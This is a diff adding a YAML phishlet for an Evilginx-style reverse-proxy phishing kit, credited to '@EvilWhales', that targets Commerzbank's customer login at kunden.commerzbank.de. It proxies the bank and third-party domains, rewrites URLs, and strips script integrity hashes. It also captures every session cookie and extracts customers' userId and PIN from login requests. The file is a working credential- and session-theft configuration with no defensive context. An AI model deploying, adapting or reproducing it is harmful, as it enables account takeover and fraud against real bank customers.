@@ -1,0 +1,59 @@
+
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'commerzbank.de', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tp', orig_sub: 'tp', domain: 'commerzbank.de', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'extend', orig_sub: 'extend', domain: 'vimeocdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'kunden', orig_sub: 'kunden', domain: 'commerzbank.de', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ad', orig_sub: 'ad', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '10291323.fls', orig_sub: '10291323.fls', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.de', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.commerzbank.de', orig_sub: 'www', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.commerzbank.de', orig_sub: 'tp', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.commerzbank.de', orig_sub: 'extend', domain: 'vimeocdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.commerzbank.de', orig_sub: 'kunden', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'safe-domain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.commerzbank.de', orig_sub: 'ad', domain: 'doubleclick.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.google.de', orig_sub: 'www', domain: 'google.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.commerzbank.de', orig_sub: '10291323.fls', domain: 'doubleclick.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'kunden.commerzbank.de', orig_sub: 'kunden', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'kunden.commerzbank.de', orig_sub: 'tp', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'kunden.commerzbank.de', orig_sub: 'extend', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'kunden.commerzbank.de', orig_sub: 'www', domain: 'commerzbank.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'kunden.commerzbank.de', orig_sub: 'ad', domain: 'doubleclick.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'kunden.commerzbank.de', orig_sub: '10291323.fls', domain: 'doubleclick.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_urls:
+  - '/lp/*'
+  - '/'
+
+auth_tokens:
+  - domain: '.commerzbank.de'
+    keys: ['.*,regexp']
+  - domain: 'kunden.commerzbank.de'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'userId'
+    search: '"userId":"(.*)"'
+    type: 'json'
+  password:
+    key: 'pin'
+    search: '"pin":"(.*)"'
+    type: 'json'
+
+login:
+  domain: 'kunden.commerzbank.de'
+  path: '/lp/login'
+
